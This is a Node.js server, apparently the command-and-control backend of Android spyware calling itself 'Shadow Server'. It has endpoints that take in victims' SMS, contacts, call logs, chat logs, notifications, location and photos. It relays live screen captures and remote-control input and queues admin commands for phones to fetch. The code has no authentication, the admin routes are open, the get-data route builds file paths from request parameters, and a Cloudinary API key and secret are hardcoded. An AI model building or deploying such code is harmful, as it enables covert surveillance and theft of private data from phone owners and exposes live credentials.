const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io"); 

const app = express();
const server = http.createServer(app); // ✅ HTTP Server Wrapper
const PORT = process.env.PORT || 3000;

// ==================================================
// 🔥 1. SOCKET.IO SETUP (ULTRA STABLE MODE)
// ==================================================
const io = new Server(server, {
    cors: {
        origin: "*", // Allow all connections
        methods: ["GET", "POST"]
    },
    // 🔥 FIX 1: 100MB Buffer Limit
    maxHttpBufferSize: 1e8, 
    // 🔥 FIX 2: Connection Timeout Badhaya (Slow network ke liye)
    pingTimeout: 60000, 
    pingInterval: 25000
});

// --- 2. CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 3. MIDDLEWARE & SETUP ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));

// Body Parser Limits (100MB)
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status Storage (RAM)
let devicesStatus = {}; 

// ==================================================
// 🔥 4. LIVE SCREEN SOCKET LOGIC (UPDATED & FIXED)
// ==================================================
io.on('connection', (socket) => {
    console.log('🔌 New Connection:', socket.id);

    // 1. Join Room (Case Insensitive Fix)
    socket.on('join', (roomID) => {
        if (!roomID) return;
        // ID ko humesha lowercase me convert karke join karwayenge
        const cleanID = roomID.toString().toLowerCase().trim();
        socket.join(cleanID);
        console.log(`🔗 Socket Joined Room: ${cleanID}`);
    });

    // 2. SCREEN SHARE (Smart Handling)
    socket.on('screen-data', (data) => {
        try {
            if (!data) return;

            // STEP A: Data Extract Karo
            let targetRoom = null;
            let finalImage = null;

            // Agar data object hai { room: "...", image: "..." }
            if (typeof data === 'object' && data.room && data.image) {
                targetRoom = data.room.toString().toLowerCase().trim();
                finalImage = data.image;
            }
            // Agar App ne galti se bina room ke bhej diya (Fallback)
            else if (data.image) {
                finalImage = data.image;
                // Yahan hume room nahi pata, to hum assume karte hain socket join kiya hua hai
                // (Ye case rarely ayega agar app sahi bana hai)
            }

            // STEP B: Binary Buffer Fix (Agar image 'Buffer' format me hai to Base64 banao)
            if (Buffer.isBuffer(finalImage)) {
                finalImage = "data:image/jpeg;base64," + finalImage.toString('base64');
            } 
            // Agar Raw Base64 string hai bina header ke
            else if (typeof finalImage === 'string' && !finalImage.startsWith('data:image')) {
                // Check karte hain ki ye JPEG hai ya PNG (Header lagana pad sakta hai)
                // Filhal simple rakhte hain, Client side JS sambhal lega
            }

            // STEP C: Bhejo (Broadcast)
            if (targetRoom && finalImage) {
                // Hum wapas wahi structure bhejenge jo HTML expect kar raha hai
                socket.to(targetRoom).emit('screen-data', { 
                    room: targetRoom, 
                    image: finalImage 
                });
            }

        } catch (error) {
            console.error("❌ Frame Error:", error.message);
        }
    });

    // 3. REMOTE CONTROL
    socket.on('control-event', (data) => {
        try {
            const { room, action, x, y, key } = data; 
            if (room) {
                const cleanID = room.toString().toLowerCase().trim();
                socket.to(cleanID).emit('control-event', { action, x, y, key });
                console.log(`🎮 Command sent to ${cleanID}: ${action}`);
            }
        } catch (e) {
            console.error("Control Error", e);
        }
    });

    socket.on('disconnect', () => {
        // console.log('❌ Disconnected:', socket.id);
    });
});

// --- ROOT ROUTE ---
app.get('/', (req, res) => {
    res.send('✅ Shadow Server is Running (Auto-Fix Mode 100MB)');
});

// ==================================================
//  GALLERY SYSTEM (HD PHOTOS) - UNCHANGED
// ==================================================

app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data Received" });

    const id = device_id.toString().trim().toUpperCase();
    let base64Image = image_data;
    if (!base64Image.startsWith('data:image')) base64Image = "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, 
        { folder: id, public_id: Date.now().toString(), resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" },
        function(error, result) {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;

    cloudinary.api.resources({
        type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true
    }, 
    function(error, result) {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS - UNCHANGED
// ==================================================

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// PHONE PING (Heartbeat)
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        let pendingCommand = "none";
        
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; 
        }

        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };

        res.json({ status: "success", command: pendingCommand });
    } catch (e) {
        res.status(500).json({ error: "Server Error" });
    }
});

// ADMIN COMMAND SENDER
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    devicesStatus[id].command = command;
    res.json({ status: "success", command: command });
});

// ==================================================
//  DATA STORAGE (Contacts, SMS, Logs) - UNCHANGED
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        } 
        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
            }
            let finalData;
            if (type === 'chat_logs') {
                finalData = [...existingData, ...newDataArray]; 
                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
            } else {
                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            }
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        } 
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

// ✅ SERVER START
server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} (Smart Fix Mode)`));
